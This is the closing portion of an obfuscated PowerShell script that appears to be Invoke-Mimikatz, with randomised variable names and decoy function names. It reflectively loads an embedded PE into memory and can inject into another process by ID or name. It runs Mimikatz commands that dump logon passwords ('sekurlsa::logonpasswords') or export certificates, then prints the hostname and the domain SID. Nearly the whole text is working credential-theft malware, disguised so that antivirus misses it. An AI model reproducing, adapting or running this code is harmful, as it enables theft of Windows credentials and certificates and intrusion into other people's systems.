        $XdmAcKgP99 = sees
        
        $PEInfo = guesstimating -IzMDqdqW99 $IzMDqdqW99 -XdmAcKgP99 $XdmAcKgP99 -Win32Constants $Win32Constants
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$IBnDPehj99 = forecastles ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $pOBXpEcy99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IBnDPehj99, [Type]$XdmAcKgP99.IMAGE_IMPORT_DESCRIPTOR)
                
                if ($pOBXpEcy99.Characteristics -eq 0 `
                        -and $pOBXpEcy99.FirstThunk -eq 0 `
                        -and $pOBXpEcy99.ForwarderChain -eq 0 `
                        -and $pOBXpEcy99.Name -eq 0 `
                        -and $pOBXpEcy99.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }
                $gLrXZELS99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((forecastles ([Int64]$PEInfo.PEHandle) ([Int64]$pOBXpEcy99.Name)))
                $fjeFeGFd99 = $ocxmKEPE99.GetModuleHandle.Invoke($gLrXZELS99)
                if ($fjeFeGFd99 -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $gLrXZELS99. Continuing anyways" -WarningAction Continue
                }
                
                $ZYkkiHnC99 = $ocxmKEPE99.FreeLibrary.Invoke($fjeFeGFd99)
                if ($ZYkkiHnC99 -eq $false)
                {
                    Write-Warning "Unable to free library: $gLrXZELS99. Continuing anyways." -WarningAction Continue
                }
                
                $IBnDPehj99 = forecastles ($IBnDPehj99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$XdmAcKgP99.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $FGfqyKEy99 = forecastles ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $EfnvJKid99 = treadled @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $Yvejqlty99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FGfqyKEy99, $EfnvJKid99)
        
        $Yvejqlty99.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $ZYkkiHnC99 = $ocxmKEPE99.VirtualFree.Invoke($IzMDqdqW99, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($ZYkkiHnC99 -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }
    Function Main
    {
        $ocxmKEPE99 = supervision
        $XdmAcKgP99 = sees
        $Win32Constants =  gorged
        
        $saVngXfx99 = [IntPtr]::Zero
    
        if (($zkndbVqG99 -ne $null) -and ($zkndbVqG99 -ne 0) -and ($BxiWsjkC99 -ne $null) -and ($BxiWsjkC99 -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($BxiWsjkC99 -ne $null -and $BxiWsjkC99 -ne "")
        {
            $FlHMVDKc99 = @(Get-Process -Name $BxiWsjkC99 -ErrorAction SilentlyContinue)
            if ($FlHMVDKc99.Count -eq 0)
            {
                Throw "Can't find process $BxiWsjkC99"
            }
            elseif ($FlHMVDKc99.Count -gt 1)
            {
                $ekIbyHCE99 = Get-Process | where { $_.Name -eq $BxiWsjkC99 } | Select-Object ProcessName, Id, SessionId
                Write-Output $ekIbyHCE99
                Throw "More than one instance of $BxiWsjkC99 found, please specify the process ID to inject in to."
            }
            else
            {
                $zkndbVqG99 = $FlHMVDKc99[0].ID
            }
        }
        
        
        if (($zkndbVqG99 -ne $null) -and ($zkndbVqG99 -ne 0))
        {
            $saVngXfx99 = $ocxmKEPE99.OpenProcess.Invoke(0x001F0FFF, $false, $zkndbVqG99)
            if ($saVngXfx99 -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $zkndbVqG99"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        
        Write-Verbose "Calling sickened"
        try
        {
            $IjKNwfoO99 = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if ($IjKNwfoO99 -is [array])
        {
            $TkfsMwhS99 = $IjKNwfoO99[0]
        } else {
            $TkfsMwhS99 = $IjKNwfoO99
        }
        if ( ( $TkfsMwhS99.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $TkfsMwhS99.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$VPcmXnGz99 = [Byte[]][Convert]::FromBase64String($eTurxLiv99)
        }
        else
        {
            [Byte[]]$VPcmXnGz99 = [Byte[]][Convert]::FromBase64String($JBqMhgEe99)
        }
        $VPcmXnGz99[0] = 0
        $VPcmXnGz99[1] = 0
        $IzMDqdqW99 = [IntPtr]::Zero
        if ($saVngXfx99 -eq [IntPtr]::Zero)
        {
            $LRLRySVk99 = sickened -VPcmXnGz99 $VPcmXnGz99 -VqCLAkop99 $VqCLAkop99
        }
        else
        {
            $LRLRySVk99 = sickened -VPcmXnGz99 $VPcmXnGz99 -VqCLAkop99 $VqCLAkop99 -saVngXfx99 $saVngXfx99
        }
        if ($LRLRySVk99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $IzMDqdqW99 = $LRLRySVk99[0]
        $CwKZDAJa99 = $LRLRySVk99[1] #only matters if you loaded in to a remote process
        
        
        $PEInfo = guesstimating -IzMDqdqW99 $IzMDqdqW99 -XdmAcKgP99 $XdmAcKgP99 -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($saVngXfx99 -eq [IntPtr]::Zero))
        {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$TZuugLMi99 = wraparounds -IzMDqdqW99 $IzMDqdqW99 -FunctionName "powershell_reflective_mimikatz"
                    if ($TZuugLMi99 -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $NnbQLPpg99 = treadled @([IntPtr]) ([IntPtr])
                    $kXJsjhhV99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($TZuugLMi99, $NnbQLPpg99)
                    $fxVHMnAO99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($VqCLAkop99)
                    [IntPtr]$gQoUMfcc99 = $kXJsjhhV99.Invoke($fxVHMnAO99)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($fxVHMnAO99)
                    if ($gQoUMfcc99 -eq [IntPtr]::Zero)
                    {
                        Throw "Unable to get output, Output Ptr is NULL"
                    }
                    else
                    {
                        $vxxahwYR99 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($gQoUMfcc99)
                        Write-Output $vxxahwYR99
                        $ocxmKEPE99.LocalFree.Invoke($gQoUMfcc99);
                    }
        }
        elseif (($PEInfo.FileType -ieq "DLL") -and ($saVngXfx99 -ne [IntPtr]::Zero))
        {
            $nkPDklzn99 = wraparounds -IzMDqdqW99 $IzMDqdqW99 -FunctionName "VoidFunc"
            if (($nkPDklzn99 -eq $null) -or ($nkPDklzn99 -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $nkPDklzn99 = rapist $nkPDklzn99 $IzMDqdqW99
            $nkPDklzn99 = forecastles $nkPDklzn99 $CwKZDAJa99
            
            $sfHoDRoM99 = firewater -sHbeaXaO99 $saVngXfx99 -StartAddress $nkPDklzn99 -ocxmKEPE99 $ocxmKEPE99
        }
        
        if ($saVngXfx99 -eq [IntPtr]::Zero)
        {
            testaments -IzMDqdqW99 $IzMDqdqW99
        }
        else
        {
            $ZYkkiHnC99 = $ocxmKEPE99.VirtualFree.Invoke($IzMDqdqW99, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($ZYkkiHnC99 -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }
    Main
}
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $vmbpgjPp99  = "Continue"
    }
    
    Write-Verbose "PowerShell ProcessID: $PID"
    
    if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
    {
        $VqCLAkop99 = "sekurlsa::logonpasswords exit"
    }
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $VqCLAkop99 = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $VqCLAkop99 = $Command
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
    if ($jkhxeKDw99 -eq $null -or $jkhxeKDw99 -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $cyoyorWO99 -ArgumentList @($eTurxLiv99, $JBqMhgEe99, "Void", 0, "", $VqCLAkop99)
    }
    else
    {
        Invoke-Command -ScriptBlock $cyoyorWO99 -ArgumentList @($eTurxLiv99, $JBqMhgEe99, "Void", 0, "", $VqCLAkop99) -jkhxeKDw99 $jkhxeKDw99
    }
}
$parts = $(whoami /user)[-1].split(" ")[1];
$UGzstcpC99 = $parts.split('-');
$PMlqoQac99 = $([System.Net.Dns]::GetHostByName(($env:computerName)).HostName);
$umJjLtAj99 = $UGzstcpC99[0..($UGzstcpC99.Count-2)] -join '-';
$eYEDoYTp99 = Main;
"Hostname: $PMlqoQac99 / $umJjLtAj99";
$eYEDoYTp99
}